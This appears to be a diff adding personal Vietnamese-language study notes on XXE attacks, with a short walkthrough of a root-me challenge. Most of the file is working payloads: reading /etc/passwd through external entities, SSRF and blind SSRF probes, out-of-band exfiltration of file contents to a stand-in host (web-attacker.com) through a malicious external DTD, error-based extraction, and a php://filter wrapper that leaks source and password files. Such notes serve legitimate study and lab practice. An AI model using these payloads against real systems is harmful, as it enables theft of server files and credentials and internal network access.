@@ -1,0 +1,54 @@
+# Retrieve file: 1 thực thể bên ngoài được xác định có chứa nội dung của tệp và được trả về trong phản hồi cuar ứng dụng
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM  "file:///etc/passwd" >]>
+    <root>
+        &read;
+    </root>
+- Có thể chỉnh sửa 1 phần tử DOCTYPE defines extension entity, có thể chỉnh sửa giá trị của xml được trả về phản hổi trong ứng dụng.
+
+
+# SSRF
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM  "http://192..168.122.138/a/b/c/d" >]>
+    <ap>
+        &read;
+    </ap>
+
+#Blind SSRF 
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://.burpcollaborator.net"> %xxe; ]>
+
+#OOB 
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
+%eval;
+%exfiltrate;
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
+<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
+
+
+#Error Based(External DTD)
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+-> Lưu với file name malicious.dtd
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
+<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
+
+#root-me
+- Bắt buộc file định dạng XML RSS
+- pastebin để raw url(rss) -> lấy url
+- Thử thêm dtd vào với payload đọc passwd (file:///etc/passwd) -> thì thông báo lỗi 
+- Thử PHP wrapper 
+"<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+    &xxe;"
+    - dn rieng của ngôn ngữ
+- php://filter chefn chức năng mã hóa base64 và được nọi dung
+ -> ta lấy được giá trị -> decode base64 -> ta thu được file_get_contents(.passwd)
+ - thay giá trị .passwd vào payload để lấy giá password
+ 
+ RMI
